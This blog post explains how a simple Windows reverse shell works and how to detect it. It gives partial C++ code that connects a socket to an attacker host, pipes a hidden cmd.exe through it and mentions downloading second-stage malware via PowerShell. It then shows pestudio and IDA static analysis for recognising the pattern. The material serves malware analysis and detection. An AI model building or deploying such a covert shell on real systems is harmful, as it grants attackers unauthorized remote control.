---
layout: post
title: Malware Functionality Analysis: Simple Reverse Shell
---

# Malware Functionality Analysis: Simple Reverse Shell

## Recommended Prerequisites

* C or C++
* x86 Intel assembly
* Windows API
* Socket programming
* Disassembly

---

## Implementing the Reverse Shell

Let's first analyse what we require to develop this functionality.

1. A socket with which commands and communication will be routed to the server,
2. A `cmd.exe` process that acts as the shell,
3. A listening server on the attacking machine (netcat will be sufficient enough for this).

---

### Creating the Connection

I will keep this section brief because creating and connecting a socket is a trivial procedure and there are many tutorials out there explaining how it can be done.

```c++
SOCKET tcpConnect(std::string address, std::string port) {
    getaddrinfo(address.c_str(), port.c_str(), ...);
    
    /*
     * Create a TCP socket connection.
     *
     * It's important that we use WSASocket here instead of the normal socket 
     * function and without the WSA_FLAG_OVERLAPPED flag.
     */
    SOCKET s = WSASocket(..., SOCK_STREAM, IPPROTO_TCP, ...);
    
    connect(s, ...);
    
    return s;
}
```

Note that we require the [`WSASocket`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx) function because the (non-overlapped) socket will be required to work with I/O redirection with the shell's handles.

---

### Creating the Shell Process

The `cmd.exe` process acts as the shell so the application must create this as a separate process using the [`CreateProcess`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx) function specifying the executable's path and also setting the stdin/stdout/stderr handles to the socket specified in the [`STARTUPINFO structure`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx).

```c++
void createShell(void) {
    SOCKET s = tcpConnect(ADDRESS, PORT);
    
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    /*
     * We specify what values we want to use.
     * STARTF_USESTDHANDLES specifies that we want to use stdin/stdout/stderr.
     * STARTF_USESHOWWINDOW specifies that we want to control how the window appears.
     */
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    
    /*
     * Set stdin/stdout/stderr to be redirected through the socket.
     */
    si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)s;
    
    /*
     * The process's window will not be shown.
     */
    si.wShowWindow = SW_HIDE;
    
    /*
     * This structure will contain the handle to the shell's 
     * process which will be used to block the application 
     * until the shell exits.
     */
    PROCESS_INFORMATION pi;
    
    /*
     * Retrieve the path of the cmd.exe executable's path.
     * We use this so that it will systemmatically retrieve the 
     * system directory which may not always be "C:\Windows\system32".
     *
     * NOTE: Depending on your application's architecture, this
     * value will change under the hood, i.e. if your application is 
     * a 32-bit process, it will get the SYSWOW64 directory whereas 
     * the 64-bit counterpart will get the system32 directory. Make 
     * sure your target file exists in its corresponding directory 
     * when doing something like this. Alternatively, you can force 
     * to not swap to SYSWOW64 by explicitly calling 
     * Wow64DisableWow64FsRedirection.
     * (https://msdn.microsoft.com/en-us/library/windows/desktop/aa365743(v=vs.85).aspx).
     */
     char szSysDirectory[MAX_PATH + 1];
     ZeroMemory(szSysDirectory, MAX_PATH + 1);
     GetSystemDirectoryA(szSysDirectory, MAX_PATH);
     
     /*
      * Append "\cmd.exe" onto the system directory.
      */
     std::string cmdExe = szSysDirectory;
     cmdExe += "\\cmd.exe";
     
     /*
      * Create the cmd.exe process.
      * Make sure that the process inherits the handles.
      */
     CreateProcessA(cmdExe.c_str(), ..., true, 0, ..., &si, &pi);
     
     /*
      * Block until the cmd.exe process has completed.
      */
     WaitForSingleObject(pi.hProcess, INFINITE);
}
```

In a more abstracted viewpoint:

```

   +-------------+               +-------------+                                    +-------------+
   |             |    spawns     |             |                                    |             |
   |             | -- cmd.exe -> |             |                                    |             |
   | Application |    process    |    Shell    | -- stdin  --.      redirected      |   Server    |
   |             |               |  (cmd.exe)  | -- stdout -----<--- through --->-- |  (netcat)   |
   |             |    passes     |             | -- stderr --'       socket         |             |
   |             | -- socket --> |             |                                    |             |
   |             |    handle     |             |                                    |             |
   +-------------+               +-------------+                                    +-------------+
```

Once the `cmd.exe` process has been created, we call [`WaitForSingleObject`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032(v=vs.85).aspx) to block the application until the shell process has finished execution.

---

## Demonstration

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample.png)

Note that there is no window for the `cmd.exe` shell process spawned from the application because we used the `SW_HIDE` value for the `STARTUPINFO.wShowWindow` member. It functions nicely using native utilities and can even be used to call PowerShell albiet a little buggy.

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample1.png)

Using a single PowerShell one-liner, a 2nd-stage malware can be downloaded and invoked on the system like so:

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample0.png)

The PowerShell script will download a file (specified in `$url`) onto the local system (specified by `$local`), then it invokes the downloaded file using `invoke-item`. The sample 2nd-stage malware is demonstrated with a shortcut file that contains a PowerShell message box script.

This can also be done with an executable (screen melter):

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample7.png)

```

   +-------------+                 +-------------+                                    +-------------+
   |             |                 |             |                                    |             |
   |             |     calls       |             |   downloads          invokes       |             |
   |    Shell    | - PowerShell -> | PowerShell  | -- remote -- and -- downloaded --> |  2nd-stage  |
   |  (cmd.exe)  |     script      |             |     file              file         |   malware   |
   |             |                 |             |                                    |             |
   |             |                 |             |                                    |             |
   +-------------+                 +-------------+                                    +-------------+
```

---

## Static Analysis

Looking at the strings under pestudio, there exists some suspicious import and miscellaneous strings that relate back to the shell creation.

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample2.png)

Obviously, the application shows signs of networking activity via the imported Winsock library (ws2_32.dll) and its functions. On top of that, it shows the `\cmd.exe` string that identifies that it may interact with it in some way. To confirm that it is being used as a reverse shell we must dig into the disassembly.

After analysis of the import table and some strings, one method that I find relatively quick and effective is by identifying where these are referenced within the code sections. This can be done with IDA by opening up the respective tab (e.g. Imports or Strings), double clicking an entry and then following any listed references to the code. For this example, following one of the Winsock library functions references the `tcpConnect` disassembly:

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample3.png)

Tracing backwards from this routine presents the `createShell` routine:

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample4.png)

(Small note: the `var_34` below the `STARTUPINFO` structure's standard handle assignment is the `STARTUPINFO.wShowWindow` member set to `SW_HIDE` which has the value of `0`.)

![ShellExample](/images/2018-04-25-Malware-Functionality-Analysis-Simple-Reverse-Shell/shellexample5.png)

Clearly, the disassembly nicely follows that of the C++ code implementation listed above. The main focus here is that a socket was created in which it was used to set the `STARTUPINFO.hStdInput`, `STARTUPINFO.hStdOuput` and `STARTUPINFO.hStdError` values of a `cmd.exe`'s `CreateProcess`. This pattern of execution flow can identify this type of reverse shell.
